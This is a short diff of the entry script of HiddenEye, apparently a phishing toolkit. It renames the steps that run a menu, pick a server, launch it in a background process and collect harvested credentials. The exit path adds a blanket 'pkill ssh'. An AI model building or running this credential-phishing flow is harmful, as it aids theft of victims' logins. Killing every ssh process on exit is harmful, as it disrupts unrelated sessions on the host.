@@ -1,5 +1,5 @@
 #
-#    HiddenEye  Copyright (C) 2021  DarkSec https://github.com/junaid153/HiddenEye-Legacy/edit/master/HiddenEye.py
+#    HiddenEye  Copyright (C) 2021  DarkSec https://github.com
 #    This program comes with ABSOLUTELY NO WARRANTY; for details read LICENSE.
 #    This is free software, and you are welcome to redistribute it
 #    under certain conditions; you can read LICENSE for details.
@@ -35,21 +35,16 @@ ConnectionController().verify_connection()
 
 if __name__ == "__main__":
     try:
-        main_runner.start_main_menu()
-        prompt.feature_prompt()
-        main_runner.enter_custom_redirecting_url()
-        port = simple_informant.port_selector()
+        runMainMenu()
 
+        inputCustom()
         ##############
-        server_runner.start_server(port)
-        server_runner.server_selection(port)
+        selectServer()
 
-        multiprocessing.Process(target=server_runner.start_server,
-                                args=(port, )).start()
-        simple_informant.credentials_collector()
+        multiprocessing.Process(target=runServer).start()
+        getCredentials()
 
     except KeyboardInterrupt:
-        # When Keyword Interrupt Occurs script will use 9090 port.(Just To Remove Exception Errors)
-        port = "8080"
-        simple_informant.exit_message(port)
-        exit()
+        system('pkill ssh')
+        endMessage()
+        exit(0)
